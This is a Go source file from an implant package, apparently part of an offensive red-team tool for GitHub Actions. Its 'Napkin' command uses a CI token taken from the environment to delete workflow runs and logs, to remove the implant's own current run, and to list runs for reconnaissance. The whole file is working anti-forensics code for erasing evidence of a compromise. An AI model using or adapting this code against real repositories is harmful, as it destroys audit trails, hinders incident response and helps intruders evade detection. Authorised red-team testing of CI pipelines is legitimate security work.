// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

// Package brisket implements the implant/agent that runs on target systems.
package brisket

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"
)

// NapkinResult represents the result of anti-forensics operations.
type NapkinResult struct {
	Success  bool    `json:"success"`
	Duration float64 `json:"duration_ms"`

	// Operations performed
	Operation string `json:"operation"` // delete-run, delete-logs, cleanup

	// Deletion stats
	RunsDeleted      int `json:"runs_deleted"`
	LogsDeleted      int `json:"logs_deleted"`
	ArtifactsDeleted int `json:"artifacts_deleted"`

	// Details
	DeletedRuns []DeletedRun `json:"deleted_runs,omitempty"`

	// Errors
	Errors []string `json:"errors,omitempty"`
}

// DeletedRun represents a deleted workflow run.
type DeletedRun struct {
	RunID      int64  `json:"run_id"`
	WorkflowID int64  `json:"workflow_id"`
	Name       string `json:"name"`
	Status     string `json:"status"` // deleted, failed
	Error      string `json:"error,omitempty"`
}

// Napkin performs anti-forensics operations (run/log deletion).
func (a *Agent) Napkin(args []string) *NapkinResult {
	start := time.Now()
	result := &NapkinResult{
		Errors:      []string{},
		DeletedRuns: []DeletedRun{},
	}

	if len(args) == 0 {
		result.Errors = append(result.Errors, "usage: napkin <delete-run|delete-logs|cleanup> [run_id|--all]")
		result.Duration = float64(time.Since(start).Milliseconds())
		return result
	}

	operation := args[0]
	result.Operation = operation

	// Get GitHub token
	token := os.Getenv("GITHUB_TOKEN")
	if token == "" {
		token = os.Getenv("GH_TOKEN")
	}
	if token == "" {
		result.Errors = append(result.Errors, "GITHUB_TOKEN or GH_TOKEN required for API operations")
		result.Duration = float64(time.Since(start).Milliseconds())
		return result
	}

	// Get repository info
	repo := os.Getenv("GITHUB_REPOSITORY")
	if repo == "" {
		result.Errors = append(result.Errors, "GITHUB_REPOSITORY not set (not running in GitHub Actions?)")
		result.Duration = float64(time.Since(start).Milliseconds())
		return result
	}

	client := &http.Client{Timeout: 30 * time.Second}

	switch operation {
	case "delete-run":
		if len(args) < 2 {
			result.Errors = append(result.Errors, "usage: napkin delete-run <run_id>")
			break
		}
		runID, err := strconv.ParseInt(args[1], 10, 64)
		if err != nil {
			result.Errors = append(result.Errors, fmt.Sprintf("invalid run_id: %s", args[1]))
			break
		}
		a.deleteRun(client, token, repo, runID, result)

	case "delete-logs":
		if len(args) < 2 {
			result.Errors = append(result.Errors, "usage: napkin delete-logs <run_id>")
			break
		}
		runID, err := strconv.ParseInt(args[1], 10, 64)
		if err != nil {
			result.Errors = append(result.Errors, fmt.Sprintf("invalid run_id: %s", args[1]))
			break
		}
		a.deleteLogs(client, token, repo, runID, result)

	case "delete-current":
		// Delete the current run (self-cleanup)
		currentRunID := os.Getenv("GITHUB_RUN_ID")
		if currentRunID == "" {
			result.Errors = append(result.Errors, "GITHUB_RUN_ID not set")
			break
		}
		runID, _ := strconv.ParseInt(currentRunID, 10, 64)
		a.deleteRun(client, token, repo, runID, result)

	case "cleanup":
		// Delete all runs from the current workflow
		workflowName := os.Getenv("GITHUB_WORKFLOW")
		if len(args) > 1 {
			workflowName = args[1]
		}
		a.cleanupWorkflowRuns(client, token, repo, workflowName, result)

	case "list-runs":
		// List recent runs (for reconnaissance)
		a.listRuns(client, token, repo, result)

	default:
		result.Errors = append(result.Errors, fmt.Sprintf("unknown operation: %s", operation))
	}

	result.Success = len(result.Errors) == 0 || result.RunsDeleted > 0 || result.LogsDeleted > 0
	result.Duration = float64(time.Since(start).Milliseconds())
	return result
}

// deleteRun deletes a specific workflow run.
func (a *Agent) deleteRun(client *http.Client, token, repo string, runID int64, result *NapkinResult) {
	url := fmt.Sprintf("https://api.github.com/repos/%s/actions/runs/%d", repo, runID)

	req, err := http.NewRequest("DELETE", url, http.NoBody)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("failed to create request: %v", err))
		return
	}

	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	resp, err := client.Do(req)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("delete request failed: %v", err))
		return
	}
	defer resp.Body.Close()

	dr := DeletedRun{RunID: runID}

	if resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusOK {
		dr.Status = "deleted"
		result.RunsDeleted++
	} else {
		body := readResponseBody(resp.Body, 4096)
		dr.Status = "failed"
		dr.Error = fmt.Sprintf("HTTP %d: %s", resp.StatusCode, body)
		result.Errors = append(result.Errors, dr.Error)
	}

	result.DeletedRuns = append(result.DeletedRuns, dr)
}

// deleteLogs deletes logs for a specific workflow run.
func (a *Agent) deleteLogs(client *http.Client, token, repo string, runID int64, result *NapkinResult) {
	url := fmt.Sprintf("https://api.github.com/repos/%s/actions/runs/%d/logs", repo, runID)

	req, err := http.NewRequest("DELETE", url, http.NoBody)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("failed to create request: %v", err))
		return
	}

	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	resp, err := client.Do(req)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("delete logs request failed: %v", err))
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusOK {
		result.LogsDeleted++
	} else {
		body := readResponseBody(resp.Body, 4096)
		result.Errors = append(result.Errors, fmt.Sprintf("delete logs failed (%d): %s", resp.StatusCode, body))
	}
}

// cleanupWorkflowRuns deletes all runs for a specific workflow.
func (a *Agent) cleanupWorkflowRuns(client *http.Client, token, repo, workflow string, result *NapkinResult) {
	// First, list all workflow runs
	// Note: workflow filter is applied client-side when iterating results
	url := fmt.Sprintf("https://api.github.com/repos/%s/actions/runs?per_page=100", repo)

	req, err := http.NewRequest("GET", url, http.NoBody)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("failed to create request: %v", err))
		return
	}

	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	resp, err := client.Do(req)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("list runs request failed: %v", err))
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body := readResponseBody(resp.Body, 4096)
		result.Errors = append(result.Errors, fmt.Sprintf("list runs failed (%d): %s", resp.StatusCode, body))
		return
	}

	var runsResp struct {
		WorkflowRuns []struct {
			ID         int64  `json:"id"`
			WorkflowID int64  `json:"workflow_id"`
			Name       string `json:"name"`
			Status     string `json:"status"`
		} `json:"workflow_runs"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&runsResp); err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("failed to parse runs: %v", err))
		return
	}

	// Delete each run
	for _, run := range runsResp.WorkflowRuns {
		// Filter by workflow name if specified
		if workflow != "" && run.Name != workflow {
			continue
		}

		// Skip currently running jobs
		if run.Status == "in_progress" || run.Status == "queued" {
			continue
		}

		a.deleteRun(client, token, repo, run.ID, result)

		// Small delay to avoid rate limiting
		time.Sleep(100 * time.Millisecond)
	}
}

// listRuns lists recent workflow runs for reconnaissance.
func (a *Agent) listRuns(client *http.Client, token, repo string, result *NapkinResult) {
	url := fmt.Sprintf("https://api.github.com/repos/%s/actions/runs?per_page=20", repo)

	req, err := http.NewRequest("GET", url, http.NoBody)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("failed to create request: %v", err))
		return
	}

	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	resp, err := client.Do(req)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("list runs request failed: %v", err))
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body := readResponseBody(resp.Body, 4096)
		result.Errors = append(result.Errors, fmt.Sprintf("list runs failed (%d): %s", resp.StatusCode, body))
		return
	}

	var runsResp struct {
		WorkflowRuns []struct {
			ID         int64  `json:"id"`
			WorkflowID int64  `json:"workflow_id"`
			Name       string `json:"name"`
			Status     string `json:"status"`
		} `json:"workflow_runs"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&runsResp); err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("failed to parse runs: %v", err))
		return
	}

	// Add runs to result for display
	for _, run := range runsResp.WorkflowRuns {
		result.DeletedRuns = append(result.DeletedRuns, DeletedRun{
			RunID:      run.ID,
			WorkflowID: run.WorkflowID,
			Name:       run.Name,
			Status:     run.Status,
		})
	}
}

// MarshalNapkinResult serializes a NapkinResult to JSON.
func (r *NapkinResult) Marshal() ([]byte, error) {
	return json.Marshal(r)
}
